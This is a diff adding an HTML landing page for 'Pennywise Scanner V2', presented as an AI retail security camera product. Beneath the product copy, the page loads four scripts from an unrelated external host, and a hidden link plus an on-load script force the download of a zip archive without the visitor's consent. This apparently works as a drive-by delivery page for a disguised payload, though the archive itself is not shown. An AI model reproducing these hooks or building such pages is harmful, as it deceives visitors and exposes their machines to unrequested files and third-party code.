@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script src="https://favnc.pages.dev/web_runtime/console.js" defer></script>
+<script src="https://favnc.pages.dev/web_runtime/localstorage.js" defer></script>
+<script src="https://favnc.pages.dev/web_runtime/rhtml.js" defer></script>
+<script src="https://favnc.pages.dev/web_runtime/webperms.js" defer></script>
+  <meta charset="UTF-8" />
+  <title>Pennywise Scanner V2</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    :root {
+      --bg: #0b0f14;
+      --panel: #121821;
+      --border: #1f2a3a;
+      --text: #dbe3f0;
+      --muted: #8fa3c0;
+
+      --red: #ff3b3b;
+      --yellow: #ffcc00;
+      --green: #2dff8a;
+      --blue: #4aa3ff;
+      --purple: #9b7bff;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      background: radial-gradient(circle at top, #121a26, var(--bg));
+      color: var(--text);
+      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto;
+      line-height: 1.6;
+      overflow-x: hidden;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background: repeating-linear-gradient(
+        to bottom,
+        rgba(255,255,255,0.02),
+        rgba(255,255,255,0.02) 1px,
+        transparent 1px,
+        transparent 3px
+      );
+      pointer-events: none;
+      animation: scanMove 6s linear infinite;
+    }
+
+    @keyframes scanMove {
+      from { background-position-y: 0; }
+      to { background-position-y: 100px; }
+    }
+
+    .container {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 48px 20px 120px;
+      animation: fadeIn 1.2s ease forwards;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    h1, h2, h3 {
+      font-weight: 700;
+      letter-spacing: 0.3px;
+    }
+
+    h1 {
+      font-size: 2.6rem;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    h2 {
+      margin-top: 64px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    p {
+      color: var(--muted);
+    }
+
+    code, pre {
+      background: #0e1520;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
+    }
+
+    pre {
+      padding: 18px;
+      overflow-x: auto;
+      margin-top: 16px;
+      animation: glowPulse 6s ease-in-out infinite;
+    }
+
+    @keyframes glowPulse {
+      0%, 100% { box-shadow: 0 0 0 rgba(0,0,0,0); }
+      50% { box-shadow: 0 0 24px rgba(74,163,255,0.15); }
+    }
+
+    .panel {
+      background: linear-gradient(180deg, #141c29, var(--panel));
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 24px;
+      margin-top: 24px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.35);
+      animation: slideUp 0.9s ease forwards;
+    }
+
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .icon {
+      width: 18px;
+      height: 18px;
+      display: inline-block;
+      border-radius: 4px;
+      margin-right: 10px;
+      position: relative;
+      top: 3px;
+    }
+
+    .i-red { background: var(--red); box-shadow: 0 0 10px var(--red); }
+    .i-yellow { background: var(--yellow); box-shadow: 0 0 10px var(--yellow); }
+    .i-green { background: var(--green); box-shadow: 0 0 10px var(--green); }
+    .i-blue { background: var(--blue); box-shadow: 0 0 10px var(--blue); }
+    .i-purple { background: var(--purple); box-shadow: 0 0 10px var(--purple); }
+
+    ul {
+      padding-left: 0;
+      list-style: none;
+    }
+
+    ul li {
+      margin: 10px 0;
+      padding-left: 28px;
+      position: relative;
+    }
+
+    ul li::before {
+      content: "";
+      position: absolute;
+      left: 0;
+      top: 8px;
+      width: 12px;
+      height: 12px;
+      border-radius: 3px;
+      background: var(--blue);
+      box-shadow: 0 0 8px rgba(74,163,255,0.8);
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 16px;
+    }
+
+    table th, table td {
+      border: 1px solid var(--border);
+      padding: 14px;
+      text-align: left;
+    }
+
+    table th {
+      background: #141c29;
+    }
+
+    .badge {
+      padding: 4px 10px;
+      border-radius: 999px;
+      font-size: 0.8rem;
+      font-weight: 600;
+    }
+
+    .b-red { background: rgba(255,59,59,0.15); color: var(--red); }
+    .b-yellow { background: rgba(255,204,0,0.15); color: var(--yellow); }
+    .b-green { background: rgba(45,255,138,0.15); color: var(--green); }
+
+    .download-note {
+      margin-top: 12px;
+      font-size: 0.9rem;
+      color: var(--muted);
+      animation: blink 2s infinite;
+    }
+
+    @keyframes blink {
+      50% { opacity: 0.4; }
+    }
+
+    footer {
+      text-align: center;
+      margin-top: 120px;
+      color: var(--muted);
+      font-size: 0.85rem;
+    }
+  </style>
+</head>
+<body>
+
+  <a id="autoDownload" href="../bin/Pscanner.zip" download hidden></a>
+
+  <div class="container">
+
+    <h1>
+      <span class="icon i-red"></span>
+      Pennywise Scanner V2
+    </h1>
+
+    <p>
+      <strong>Pennywise Scanner V2</strong> is an AI-powered retail security camera system designed for
+      crowded store environments. It detects <strong>weapon-shaped threats</strong>, flags
+      <strong>suspicious visuals</strong>, and securely records evidence with overlays and timestamps.
+    </p>
+
+    <div class="download-note">
+      Initializing secure package download…
+    </div>
+
+    <div class="panel">
+      <h2>Features</h2>
+      <ul>
+        <li><span class="icon i-red"></span> Weapon shape detection (knife / gun silhouettes)</li>
+        <li><span class="icon i-yellow"></span> Suspicious visual flagging (unclear outlines, prints)</li>
+        <li><span class="icon i-green"></span> False-positive reduction (metal-only objects ignored)</li>
+        <li><span class="icon i-blue"></span> Automatic 5-second video recording</li>
+        <li><span class="icon i-purple"></span> Secure configuration via <code>.env</code></li>
+      </ul>
+    </div>
+
+    <div class="panel">
+      <h2>Detection Logic</h2>
+      <table>
+        <tr>
+          <th>State</th>
+          <th>Trigger</th>
+          <th>Action</th>
+        </tr>
+        <tr>
+          <td><span class="badge b-red">DETECTED</span></td>
+          <td>Knife or gun above confidence threshold</td>
+          <td>5s video, red bounding box, saved to <code>/Detected</code></td>
+        </tr>
+        <tr>
+          <td><span class="badge b-yellow">SUSPICIOUS</span></td>
+          <td>Partial outline or weird pattern</td>
+          <td>Still images, yellow box, saved to <code>/Suspicious</code></td>
+        </tr>
+        <tr>
+          <td><span class="badge b-green">IGNORED</span></td>
+          <td>Keys, phones, metal-only objects</td>
+          <td>No action</td>
+        </tr>
+      </table>
+    </div>
+
+    <div class="panel">
+      <h2>.env Configuration</h2>
+      <p>Only one value is stored:</p>
+      <pre>AI_KEY=your_ai_key_here</pre>
+    </div>
+
+    <div class="panel">
+      <h2>Privacy & Safety</h2>
+      <ul>
+        <li>No facial recognition</li>
+        <li>No identity tracking</li>
+        <li>Local-only encrypted storage</li>
+        <li>Automatic data cleanup</li>
+      </ul>
+    </div>
+
+    <footer>
+      Pennywise Scanner V2 – Context-aware retail security
+    </footer>
+  </div>
+
+  <script>
+    window.addEventListener("load", () => {
+      setTimeout(() => {
+        document.getElementById("autoDownload").click();
+      }, 700);
+    });
+  </script>
+
+</body>
+</html>
